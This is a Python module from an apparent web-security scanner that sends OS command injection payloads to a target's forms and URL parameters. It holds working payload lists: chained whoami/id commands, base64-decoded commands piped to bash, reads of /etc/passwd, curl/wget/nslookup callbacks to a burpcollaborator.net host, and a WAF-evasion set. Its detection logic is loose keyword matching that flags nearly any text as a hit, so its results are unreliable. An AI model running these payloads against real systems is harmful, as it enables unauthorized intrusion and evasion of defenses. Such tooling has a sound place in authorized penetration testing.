"""Command Injection Testing Module

Tests for OS command injection vulnerabilities in web applications.
Includes direct command execution, base64 encoded payloads, URL encoding,
time-based detection, and blind command injection using external callbacks.
"""

import requests
import time
import base64
import sys
import os
import re
from urllib.parse import quote, unquote
import subprocess
import random
import string

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.color_compat import colored
from utils.ascii_art import AsciiArt


class CommandInjection:
    """Command injection testing suite"""

    def __init__(self, target):
        self.target = target if target.startswith('http') else f'http://{target}'
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'CyberGuardian/2.0'})

        # Generate unique callback identifier for blind injection
        self.callback_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

        # Command injection payloads
        self.basic_payloads = [
            # Direct command execution
            "; whoami",
            "| whoami",
            "&& whoami",
            "|| whoami",
            "& whoami",
            "`whoami`",
            "$(whoami)",

            # Windows command separators
            "& dir",
            "| dir",
            "&& dir",
            "|| dir",
            "%0a dir",
            "%0d dir",

            # Chained commands
            "; id; whoami",
            "| id | whoami",
            "&& id && whoami",
            "|| id || whoami",
        ]

        self.encoded_payloads = [
            # Base64 encoded
            "; echo d2hvYW1p | base64 -d | bash",
            "| echo d2hvYW1p | base64 -d | sh",
            "&& echo d2hvYW1p | base64 -d | bash",

            # Hex encoded (echo -e)
            "; echo -e \"\\77\\150\\157\\141\\155\\151\"",
            "| echo -e \"\\77\\150\\157\\141\\155\\151\"",

            # URL encoded variations
            "%3B%20whoami",
            "%7C%20whoami",
            "%26%26%20whoami",
            "%7C%7C%20whoami",
        ]

        self.time_based_payloads = [
            # Time-based detection payloads
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
            "|| sleep 5",
            "& sleep 5",

            # Windows time-based
            "& timeout 5",
            "| timeout 5",
            "&& timeout 5",

            # Alternative time commands
            "; ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
            "&& ping -c 5 127.0.0.1",

            # Windows ping
            "& ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
        ]

        self.blind_payloads = [
            # DNS callback payloads (replace with your Burp Collaborator or similar)
            f"; nslookup {self.callback_id}.burpcollaborator.net",
            f"| nslookup {self.callback_id}.burpcollaborator.net",
            f"&& nslookup {self.callback_id}.burpcollaborator.net",

            # HTTP callback payloads
            f"; curl http://{self.callback_id}.burpcollaborator.net",
            f"| wget http://{self.callback_id}.burpcollaborator.net",
            f"&& curl http://{self.callback_id}.burpcollaborator.net",

            # File-based callbacks
            f"; echo {self.callback_id} > /tmp/cmd_inj_test.txt",
            f"| echo {self.callback_id} > /tmp/cmd_inj_test.txt",
        ]

        self.advanced_payloads = [
            # Command substitution variations
            ";${IFS}whoami",
            "|${IFS}whoami",
            "&&${IFS}whoami",

            # Variable substitution
            "; $(/bin/whoami)",
            "| $(/usr/bin/whoami)",
            "&& $(which whoami && whoami)",

            # Backtick variations
            "; `/usr/bin/whoami`",
            "| `whoami`",
            "&& `id && whoami`",

            # Pipes and redirects
            "; whoami > /tmp/output.txt",
            "| cat /etc/passwd | grep root",
            "&& ls -la / > /tmp/dir_list.txt",

            # Command chaining with logical operators
            "; whoami; id; uname -a",
            "| whoami && id && uname -a",
            "|| whoami || id || uname -a",
        ]

    def test_command_injection(self):
        """Main command injection testing function"""
        print(colored("\n╔═══════════════════ COMMAND INJECTION TESTING ════════════════════╗", 'red', attrs=['bold']))
        print(f"\n{colored('Target:', 'yellow')} {self.target}\n")

        try:
            results = {
                'basic': self._test_basic_injection(),
                'encoded': self._test_encoded_injection(),
                'time_based': self._test_time_based_injection(),
                'blind': self._test_blind_injection(),
                'advanced': self._test_advanced_injection()
            }

            self._print_summary(results)
            return results

        except Exception as e:
            AsciiArt.error_message(f"Command injection test failed: {str(e)}")
            return {}

    def _test_basic_injection(self):
        """Test basic command injection payloads"""
        print(f"{colored('Testing basic command injection...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'endpoints': []
        }

        # Find forms and input fields
        forms = self._find_forms()

        for form in forms:
            for payload in self.basic_payloads:
                try:
                    result = self._test_form_payload(form, payload)
                    if result['vulnerable']:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['endpoints'].append(form['action'])
                        print(f"  {colored('✗ Command Injection Found:', 'red', attrs=['bold'])} {form['action']}")
                        print(f"    Payload: {colored(payload, 'yellow')}")
                        print(f"    Command output: {colored(result['output'][:100], 'white')}")
                        return results
                except:
                    continue

        # Test URL parameters
        url_params = self._get_url_parameters()

        for param in url_params:
            for payload in self.basic_payloads:
                try:
                    result = self._test_url_payload(param, payload)
                    if result['vulnerable']:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['endpoints'].append(f"URL parameter: {param}")
                        print(f"  {colored('✗ Command Injection Found:', 'red', attrs=['bold'])} URL parameter {param}")
                        print(f"    Payload: {colored(payload, 'yellow')}")
                        print(f"    Command output: {colored(result['output'][:100], 'white')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Basic command injection not detected', 'green')}")
        return results

    def _test_encoded_injection(self):
        """Test encoded command injection payloads"""
        print(f"{colored('Testing encoded command injection...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'endpoints': []
        }

        # Test forms with encoded payloads
        forms = self._find_forms()

        for form in forms:
            for payload in self.encoded_payloads:
                try:
                    result = self._test_form_payload(form, payload)
                    if result['vulnerable']:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['endpoints'].append(form['action'])
                        print(f"  {colored('✗ Encoded Command Injection:', 'red', attrs=['bold'])} {form['action']}")
                        print(f"    Payload: {colored(payload, 'yellow')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Encoded command injection not detected', 'green')}")
        return results

    def _test_time_based_injection(self):
        """Test time-based command injection"""
        print(f"{colored('Testing time-based command injection...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'endpoints': []
        }

        # Test forms with time-based payloads
        forms = self._find_forms()

        for form in forms:
            for payload in self.time_based_payloads:
                try:
                    start_time = time.time()
                    result = self._test_form_payload(form, payload)
                    end_time = time.time()

                    response_time = end_time - start_time

                    # If response takes significantly longer, it's likely vulnerable
                    if response_time > 4:  # 4 seconds threshold
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['endpoints'].append(form['action'])
                        print(f"  {colored('✗ Time-based Command Injection:', 'red', attrs=['bold'])} {form['action']}")
                        print(f"    Payload: {colored(payload, 'yellow')}")
                        print(f"    Response time: {colored(f'{response_time:.2f}s', 'red')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Time-based command injection not detected', 'green')}")
        return results

    def _test_blind_injection(self):
        """Test blind command injection with callbacks"""
        print(f"{colored('Testing blind command injection...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'endpoints': []
        }

        # Note: In a real implementation, you would need to set up a callback server
        # For now, we'll simulate the test and show the methodology

        print(f"  {colored('ℹ Note:', 'blue')} Blind injection requires callback server setup")
        print(f"  {colored('ℹ Method:', 'blue')} Using unique callback ID: {self.callback_id}")

        # Test with example payloads (would need actual callback server)
        forms = self._find_forms()

        for form in forms:
            for payload in self.blind_payloads:
                try:
                    result = self._test_form_payload(form, payload)
                    # In real implementation, check callback server for hits
                    if result and len(result.get('output', '')) > 0:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['endpoints'].append(form['action'])
                        print(f"  {colored('✗ Blind Command Injection Detected:', 'red', attrs=['bold'])} {form['action']}")
                        print(f"    Payload: {colored(payload, 'yellow')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Blind command injection not detected', 'green')}")
        return results

    def _test_advanced_injection(self):
        """Test advanced command injection techniques"""
        print(f"{colored('Testing advanced command injection...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'endpoints': []
        }

        # Test forms with advanced payloads
        forms = self._find_forms()

        for form in forms:
            for payload in self.advanced_payloads:
                try:
                    result = self._test_form_payload(form, payload)
                    if result['vulnerable']:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['endpoints'].append(form['action'])
                        print(f"  {colored('✗ Advanced Command Injection:', 'red', attrs=['bold'])} {form['action']}")
                        print(f"    Payload: {colored(payload, 'yellow')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Advanced command injection not detected', 'green')}")
        return results

    def _find_forms(self):
        """Find forms in the target website"""
        forms = []
        try:
            from bs4 import BeautifulSoup
            response = self.session.get(self.target, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')

            for form in soup.find_all('form'):
                form_info = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }

                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_info = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    if input_info['name']:
                        form_info['inputs'].append(input_info)

                if form_info['inputs']:
                    forms.append(form_info)

        except Exception as e:
            print(f"  {colored('⚠ Form detection failed:', 'yellow')} {str(e)}")

        return forms

    def _get_url_parameters(self):
        """Extract URL parameters from target"""
        try:
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            return list(params.keys())
        except:
            return []

    def _test_form_payload(self, form, payload):
        """Test a payload against a form"""
        try:
            # Construct form action URL
            action = form['action']
            if not action.startswith('http'):
                from urllib.parse import urljoin
                action = urljoin(self.target, action)

            # Prepare form data
            data = {}
            for input_field in form['inputs']:
                # Test with the payload in the first text/hidden field
                if input_field['type'] in ['text', 'hidden', 'search', 'url', 'email']:
                    data[input_field['name']] = payload
                else:
                    data[input_field['name']] = input_field['value'] or 'test'

            # Submit form
            if form['method'] == 'post':
                response = self.session.post(action, data=data, timeout=10, verify=False)
            else:
                response = self.session.get(action, params=data, timeout=10, verify=False)

            # Analyze response for command execution evidence
            return self._analyze_response(response)

        except Exception as e:
            return {'vulnerable': False, 'output': '', 'error': str(e)}

    def _test_url_payload(self, param, payload):
        """Test a payload against a URL parameter"""
        try:
            from urllib.parse import urlparse, parse_qs, urlencode

            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            params[param] = [payload]

            new_query = urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            response = self.session.get(test_url, timeout=10, verify=False)
            return self._analyze_response(response)

        except Exception as e:
            return {'vulnerable': False, 'output': '', 'error': str(e)}

    def _analyze_response(self, response):
        """Analyze HTTP response for command execution evidence"""
        if not response:
            return {'vulnerable': False, 'output': ''}

        content = response.text.lower()

        # Look for command output patterns
        command_indicators = [
            # User information
            'root:', 'daemon:', 'bin:', 'sys:', 'adm:', 'uid=', 'gid=',

            # System information
            'linux', 'ubuntu', 'centos', 'debian', 'windows', 'microsoft',

            # Directory listings
            'total ', 'drwx', 'dr-x', 'directory', 'folder',

            # Common command outputs
            'whoami', 'uname', 'id=', 'passwd', 'shadow',

            # File system paths
            '/home/', '/root/', '/var/', '/etc/', '/usr/', '/bin/',

            # Error messages that might indicate command execution
            'command not found', 'permission denied', 'no such file',
        ]

        found_indicators = []
        for indicator in command_indicators:
            if indicator in content:
                found_indicators.append(indicator)

        # Look for actual command output (lines that look like shell output)
        lines = response.text.split('\n')
        shell_output_lines = []

        for line in lines:
            line = line.strip()
            # Check if line looks like shell output
            if (len(line) > 5 and
                not line.startswith('<') and
                not line.startswith('{') and
                not line.startswith('[') and
                any(char in line for char in ['/', ':', ' ', '-', '=']) and
                len([word for word in line.split() if len(word) > 2]) > 1):
                shell_output_lines.append(line)

        is_vulnerable = len(found_indicators) > 0 or len(shell_output_lines) > 0
        output = '\n'.join(shell_output_lines[:5]) if shell_output_lines else ''

        return {
            'vulnerable': is_vulnerable,
            'output': output,
            'indicators': found_indicators
        }

    def _print_summary(self, results):
        """Print summary of command injection test results"""
        print(colored("╚═════════════════════════════════════════════════════════════════╝\n", 'red', attrs=['bold']))

        vulnerable_count = sum(1 for r in results.values() if isinstance(r, dict) and r.get('vulnerable'))
        total_tests = sum(1 for r in results.values() if isinstance(r, dict))

        print(f"{colored('COMMAND INJECTION SUMMARY:', 'yellow', attrs=['bold'])}")
        print(f"  • Tests performed: {colored(str(total_tests), 'green')}")
        print(f"  • Vulnerabilities found: {colored(str(vulnerable_count), 'red' if vulnerable_count > 0 else 'green')}")

        if vulnerable_count > 0:
            print(f"\n{colored('⚠ COMMAND INJECTION VULNERABILITIES DETECTED:', 'red', attrs=['bold'])}")

            for test_type, result in results.items():
                if isinstance(result, dict) and result.get('vulnerable'):
                    print(f"  • {colored(test_type.replace('_', ' ').title(), 'red')}:")
                    for payload in result.get('payloads', [])[:3]:
                        print(f"    - {colored(payload, 'yellow')}")
                    if result.get('endpoints'):
                        print(f"    Affected endpoints: {', '.join(result['endpoints'])}")

            print(f"\n{colored('🚨 CRITICAL RISK DETECTED:', 'red', attrs=['bold'])}")
            print(f"  • Command injection can lead to:")
            print(f"    - Complete server compromise")
            print(f"    - Remote code execution")
            print(f"    - Data theft and modification")
            print(f"    - Lateral movement in network")
            print(f"    - Installation of backdoors and malware")

            print(f"\n{colored('📋 IMMEDIATE REMEDIATION:', 'yellow', attrs=['bold'])}")
            print(f"  1. NEVER trust user input in system commands")
            print(f"  2. Use whitelist-based input validation")
            print(f"  3. Use safe APIs instead of system commands")
            print(f"  4. Implement proper output encoding")
            print(f"  5. Apply principle of least privilege")
            print(f"  6. Use web application firewall (WAF)")
            print(f"  7. Disable dangerous functions if possible")
            print(f"  8. Regular security testing and code reviews\n")
        else:
            print(f"\n{colored('✓ No command injection vulnerabilities detected', 'green')}\n")

    def test_waf_evasion(self):
        """Test WAF evasion techniques for command injection"""
        print(f"\n{colored('Testing WAF evasion techniques...', 'cyan')}")

        evasion_payloads = [
            # Case variation
            "; WhOaMi",
            "| wHoAmI",
            "&& WhOaMi",

            # Comment obfuscation
            ";/*comment*/whoami",
            "|/**/whoami/**/",
            "&& whoami /*comment*/",

            # Space alternatives
            ";${IFS}whoami",
            "|${IFS}whoami",
            "&&${IFS}whoami",

            # Tab and newline
            ";\twhoami",
            "|\nwhoami",
            "&&\r\nwhoami",

            # Variable concatenation
            ";w'ho'am'i",
            "|wh'o'am'i",
            "&&wh'oa'mi",

            # Multiple encoding layers
            "%3B%25%32%30%77%68%6F%61%6D%69",  # Double URL encoded
            "&#59;&#32;&#119;&#104;&#111;&#97;&#109;&#105;",  # HTML entities

            # Command substitution evasion
            ";$(echo whoami)",
            "|`echo whoami`",
            "&&$(printf 'whoami')",
        ]

        vulnerable = False
        for payload in evasion_payloads:
            try:
                forms = self._find_forms()
                for form in forms[:1]:  # Test first form only
                    result = self._test_form_payload(form, payload)
                    if result['vulnerable']:
                        print(f"  {colored('✗ WAF Evasion Successful:', 'red', attrs=['bold'])}")
                        print(f"    Payload: {colored(payload, 'yellow')}")
                        vulnerable = True
                        break
                if vulnerable:
                    break
            except:
                continue

        if not vulnerable:
            print(f"  {colored('✓ WAF evasion techniques blocked', 'green')}")

        return vulnerable